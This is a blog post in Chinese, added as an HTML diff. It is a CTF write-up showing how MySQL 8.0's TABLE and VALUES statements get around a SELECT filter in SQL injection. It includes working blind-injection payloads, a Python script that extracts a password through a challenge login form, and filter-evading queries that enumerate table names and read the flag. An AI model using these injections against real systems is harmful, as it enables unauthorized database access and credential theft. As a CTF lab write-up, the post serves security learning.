@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            绕过Select过滤 By Mysql 8.0 新特性
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Select%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86"><span class="toc-text">Select被过滤了</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MYSQL8%E7%9A%84%E6%96%B0%E7%89%B9%E6%80%A7"><span class="toc-text">MYSQL8的新特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TABLE-Statement"><span class="toc-text">TABLE Statement</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VALUES-Statement"><span class="toc-text">VALUES Statement</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87SELECT%E8%BF%87%E6%BB%A4"><span class="toc-text">绕过SELECT过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%98%B6%E5%90%BCCTF-ezsql"><span class="toc-text">嘶吼CTF - ezsql</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末剩余了一点时间做了一道嘶吼CTF的题，刚用sql注入跑出来密码的时候以为这道题就结束了，没想到才刚刚开始。于是卡在了绕过SELECT那个点，最终用到了一个Mysql8.0的新特性，可以用来绕过select过滤的漏洞环境。简单整理了一下。</p>
+<h2 id="Select被过滤了"><a href="#Select被过滤了" class="headerlink" title="Select被过滤了"></a>Select被过滤了</h2><p>遇到SELECT被过去的情况下，一般我的思路是这样的：</p>
+<ol>
+<li>表内注入</li>
+<li>堆叠注入</li>
+<li>handler注入</li>
+<li>load_file直接读文件</li>
+<li>根据题目环境特性针对性的绕过(大小写、双写等)</li>
+</ol>
+<p>但是今天遇到的这道题把2、3、4的关键函数都过滤了，没有办法，只能寻找新的思路。我在看了version之后也尝试过去寻找Mysql8的新特性，没找到相关内容。最后在队友的提示下才记起来P神圈子里有一篇文章讲到了Mysql8下的新利用。这篇文章也算是对这个知识点的笔记(以后遇到新知识还是要好好做记录)</p>
+<h2 id="MYSQL8的新特性"><a href="#MYSQL8的新特性" class="headerlink" title="MYSQL8的新特性"></a>MYSQL8的新特性</h2><h3 id="TABLE-Statement"><a href="#TABLE-Statement" class="headerlink" title="TABLE Statement"></a>TABLE Statement</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</span><br></pre></td></tr></table></figure>
+
+<p>文档参考：<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/table.html">https://dev.mysql.com/doc/refman/8.0/en/table.html</a><br>这条命令的功能跟<code>SELECT * FROM xxx</code>是一样的，查询一个表里面的所有内容，返回的也就是“表数据”。并且支持<code>ORDER BY</code>、<code>TABLE</code>、<code>LIMIT</code>三种限定符。</p>
+<p><img src="https://i.imgur.com/5S6bjaB.jpg" alt="-w695"></p>
+<h3 id="VALUES-Statement"><a href="#VALUES-Statement" class="headerlink" title="VALUES Statement"></a>VALUES Statement</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">VALUES</span> row_constructor_list [<span class="keyword">ORDER</span> <span class="keyword">BY</span> column_designator] [<span class="keyword">LIMIT</span> <span class="keyword">BY</span> <span class="built_in">number</span>]</span><br><span class="line"></span><br><span class="line">row_constructor_list:</span><br><span class="line">    <span class="keyword">ROW</span>(value_list)[, <span class="keyword">ROW</span>(value_list)][, ...]</span><br><span class="line"></span><br><span class="line">value_list:</span><br><span class="line">    <span class="keyword">value</span>[, <span class="keyword">value</span>][, ...]</span><br><span class="line"></span><br><span class="line">column_designator:</span><br><span class="line">    column_index</span><br></pre></td></tr></table></figure>
+
+<p>文档参考：<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/values.html">https://dev.mysql.com/doc/refman/8.0/en/values.html</a><br>这个语句可以把一组一个或多个行作为表展示出来，返回的也是一个表数据。这里的ROW()返回的是一个行数据，VALUES就是将这样的行数据增加上字段整理为一个表，然后展示。</p>
+<p><img src="https://i.imgur.com/IDdkLpu.jpg" alt="-w624"></p>
+<p>由于TABLE命令和VALUES返回的都是表数据，它们所返回的数据可以通过<code>UNION</code>语句联合起来。</p>
+<p><img src="https://i.imgur.com/Yd7e5u4.jpg" alt="-w800"></p>
+<p>实际上这个VALUES语句跟后面我们要说的绕过SELECT没太大的关系，但可以通过这个语句了解一下行数据与表数据。</p>
+<h3 id="绕过SELECT过滤"><a href="#绕过SELECT过滤" class="headerlink" title="绕过SELECT过滤"></a>绕过SELECT过滤</h3><ul>
+<li>使用union联合查询获取表中的所有内容</li>
+</ul>
+<p>因为TABLE返回的是表数据，可以与SELECT所查询出来的数据使用UNION联合查询出结果。但是这样的方式存在一定的限制，两个查询的表中字段数必须要一致。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">UNION</span> <span class="keyword">TABLE</span> news;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/46xLIb4.jpg" alt="-w707"></p>
+<ul>
+<li>盲注查询其他任意表中的内容</li>
+</ul>
+<p>那如果我们要查询字段数不一样的表该怎么办？ 这时候可以用盲注来进行猜测。猜测过程其实跟无列名注入很像。具体过程如图：</p>
+<p><img src="https://i.imgur.com/6PvKmYj.jpg" alt="-w786"></p>
+<p>OK，有了上面的知识前提下，解题的思路就清晰了。详细记录了一下题目的解题过程如下。</p>
+<h2 id="嘶吼CTF-ezsql"><a href="#嘶吼CTF-ezsql" class="headerlink" title="嘶吼CTF - ezsql"></a>嘶吼CTF - ezsql</h2><p>在用户名处发现盲注：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&#39;and(1&#x3D;1)and&#39;1&amp;password&#x3D;</span><br><span class="line">1&#x3D;1</span><br><span class="line">&lt;script&gt;alert(&quot;password error!&quot;);history.go(-1);&lt;&#x2F;script&gt;</span><br><span class="line">1&#x3D;2</span><br><span class="line">&lt;script&gt;alert(&quot;username error!&quot;);history.go(-1);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"># 这样也可以</span><br><span class="line">username&#x3D;admin&#39;and(1&#x3D;1)#&amp;password&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>但是存在一定的过滤：</p>
+<p><img src="https://i.imgur.com/MuAKJ5d.jpg" alt="-w552"></p>
+<p>比较重要的是把SELECT过滤了，所以我只尝试读出了一些基本信息与password。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">version() : 8.0.22-0ubuntu0.20.04.2</span><br><span class="line">database() : ctf</span><br></pre></td></tr></table></figure>
+
+<p>盲注脚本（我发现挂代理的时候会容易被ban，可以用vps来跑）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36&quot;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://139.129.98.9:30003/login.php&quot;</span> <span class="comment"># 漏洞地址</span></span><br><span class="line">key = <span class="string">&quot;password&quot;</span> <span class="comment"># 关键字</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># length = 32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">300</span>):</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&#x27;and(length(password)=&#123;&#125;)and&#x27;1&quot;</span>.<span class="built_in">format</span>(i), <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    print(burp0_data)</span><br><span class="line">    response = requests.post(url, headers=burp0_headers, data=burp0_data)</span><br><span class="line">    text = response.content.decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> text.find(key) != -<span class="number">1</span>: <span class="comment"># 有关键字</span></span><br><span class="line">        print(<span class="string">&quot;Length&quot;</span>, i)</span><br><span class="line">        length = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">        burp0_data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&#x27;and(ascii(substr(password,&#123;&#125;,1))=&#123;&#125;)and&#x27;1&quot;</span>.<span class="built_in">format</span>(j,i), <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">        print(burp0_data)</span><br><span class="line">        response = requests.post(url, headers=burp0_headers, data=burp0_data)</span><br><span class="line">        text = response.content.decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> text.find(key) != -<span class="number">1</span>:</span><br><span class="line">            result = result + <span class="built_in">chr</span>(i)</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>读出来的password：b4bc4c343ed120df3bff56d586e6d617<br>md5查询的结果为：gml666<br>登录之后发现并没有flag，所以还是需要看一下有没有其他的思路。尝试过的思路如下：</p>
+<ol>
+<li>读文件 =&gt; load_file被过滤</li>
+<li>Mysql8 TABLE &amp; VALUE新特性<br> 踩坑1：不知道flag的表名是什么 =&gt;<pre><code>1. 盲猜flag表中的数据=&gt;flag、f1ag、f14g都不行。
+2. 把数据库information里面的表盲注跑一遍</code></pre>
+</li>
+</ol>
+<p>通过2.2的方式可以跑出ctf库中的表名，因为无法使用<code>WHERE</code>条件语句，这里通过使用<code>ORDER BY</code>排序和<code>OFFSET</code>限制可以比较快的确定ctf库的数据位置(可以本地搭一个Mysql8来进行测试)。表名应该不是很长，我就直接手动跑了。这里有一个小坑：就是当获取表名的时候，前面几位都是取盲注变化时的前一个值，最后一位则是要取变化时的那一个值。这是因为，当两个数据相等时，就会接着对比下一个字段值了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 跑表名的payload</span><br><span class="line">username&#x3D;admin&#39;and((TABLE%09information_schema.tables%09ORDER%09BY%09TABLE_SCHEMA%09LIMIT%091%09OFFSET%090)&gt;(&#39;def&#39;,&#39;ctf&#39;,&#39;§1§&#39;,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1))#&amp;password&#x3D;gml666</span><br><span class="line"></span><br><span class="line"># 跑出的表名</span><br><span class="line">admin</span><br><span class="line">f11114g</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/4j29Mbn.png"></p>
+<p>直接猜测<code>f11114g</code>表里面只有一个flag字段，继续盲注发现在第二条数据里面是flag。盲注脚本不好写，就直接手动跑了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 跑flag的payload：</span><br><span class="line">username&#x3D;admin&#39;and((TABLE%09f11114g%09LIMIT%091)&gt;(&#39;a&#39;))#&amp;password&#x3D;gml666</span><br><span class="line"></span><br><span class="line"># 跑出来的flag(需要从大写转为小写)：</span><br><span class="line">flag&#123;6a55e234-1ed0-455c-bbf3-6df6ddce9a57&#125;</span><br><span class="line"></span><br><span class="line"># 最终语句：</span><br><span class="line">username&#x3D;admin&#39;and((TABLE%09f11114g%09LIMIT%091%09OFFSET%091)&gt;(&#39;FLAG&#123;6A55E234-1ED0-455C-BBF3-6DF6DDCE9A57&#125;§1§&#39;))#&amp;password&#x3D;gml666</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/mD0n1WU.png"></p>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
